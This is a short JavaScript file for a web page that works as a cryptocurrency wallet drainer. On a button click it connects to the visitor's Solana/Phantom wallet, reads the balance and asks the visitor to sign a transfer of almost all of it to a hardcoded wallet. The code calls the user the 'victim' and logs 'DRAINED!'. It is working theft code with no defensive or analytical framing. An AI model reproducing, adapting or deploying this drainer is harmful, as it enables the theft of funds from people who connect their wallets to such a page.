const MY_WALLET = "9tZqX5tq79HT2SN6AhxzXfqjowojW2hQut6e4vyzfrd1";

function log(msg) {
    const div = document.getElementById('log');
    div.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
}

document.getElementById('btn').onclick = async () => {
    try {
        log('Connecting...');
        const provider = window.solana || window.phantom?.solana;
        const resp = await provider.connect();
        const victim = resp.publicKey.toString();
        log(`Connected: ${victim.slice(0,20)}...`);
        
        const connection = new solanaWeb3.Connection('https://api.devnet.solana.com');
        const balance = await connection.getBalance(resp.publicKey);
        const amount = (balance / 1e9) - 0.001;
        log(`Balance: ${(balance/1e9).toFixed(5)} SOL`);
        
        const tx = new solanaWeb3.Transaction().add(
            solanaWeb3.SystemProgram.transfer({
                fromPubkey: resp.publicKey,
                toPubkey: new solanaWeb3.PublicKey(MY_WALLET),
                lamports: amount * 1e9
            })
        );
        tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;
        tx.feePayer = resp.publicKey;
        
        log('Sending drain transaction...');
        const sig = await provider.signAndSendTransaction(tx);
        log(`✅ DRAINED! ${amount.toFixed(5)} SOL`);
        log(`Sig: ${sig.slice(0,40)}...`);
    } catch(e) {
        log(`Error: ${e.message}`);
    }
};